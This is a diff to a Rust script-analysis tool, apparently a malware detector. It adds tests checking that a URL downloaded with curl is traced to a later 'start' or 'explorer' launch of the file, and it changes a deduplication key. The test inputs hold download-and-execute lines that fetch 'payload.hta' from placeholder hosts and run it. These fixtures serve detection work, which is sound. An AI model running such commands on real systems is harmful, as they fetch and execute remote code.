@@ -2195,6 +2195,50 @@ C:\Users\Public\ci.tmp /w:C:\Users\Public
     }
 
     #[test]
+    fn start_local_target_resolves_prior_download_source_url() {
+        let report = analyze(
+            b"curl -o payload.hta https://start-local-source.example/payload.hta\r\nstart payload.hta\r\n",
+            &AnalyzeConfig::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "start payload.hta"
+                            && url == "https://start-local-source.example/payload.hta"
+                )
+            }),
+            "start local target did not resolve prior download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn local_launcher_url_arguments_keep_command_provenance() {
+        let report = analyze(
+            br#"curl -o payload.hta https://local-provenance.example/payload.hta
+explorer payload.hta
+start payload.hta"#,
+            &AnalyzeConfig::default(),
+        );
+        for expected_cmd in ["explorer payload.hta", "start payload.hta"] {
+            assert!(
+                report.traits.iter().any(|t| {
+                    matches!(
+                        t,
+                        Trait::UrlArgument { cmd, url }
+                            if cmd == expected_cmd
+                                && url == "https://local-provenance.example/payload.hta"
+                    )
+                }),
+                "{expected_cmd} UrlArgument was deduplicated or missing: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
     fn unknown_redirected_command_does_not_emit_unresolved_pipeline() {
         let script = b"GIFTS WITH DISCOUNTS >nul 2>&1 LIMITED OFFER\r\n";
         let report = analyze(script, &AnalyzeConfig::default());
@@ -3787,7 +3831,7 @@ fn semantic_dedup_key(t: &Trait) -> Option<String> {
             Some(format!("Download\0{src}\0{}", dst.as_deref().unwrap_or("")))
         }
         Trait::UrlLaunch { url, .. } => Some(format!("UrlLaunch\0{url}")),
-        Trait::UrlArgument { url, .. } => Some(format!("UrlArgument\0{url}")),
+        Trait::UrlArgument { cmd, url } => Some(format!("UrlArgument\0{cmd}\0{url}")),
         Trait::UrlVariable { name, url, .. } => Some(format!("UrlVariable\0{name}\0{url}")),
         Trait::RemoteConnect { host, port, .. } => Some(format!("RemoteConnect\0{host}\0{port}")),
         Trait::RegistryUrl { value, url, .. } => Some(format!("RegistryUrl\0{value}\0{url}")),
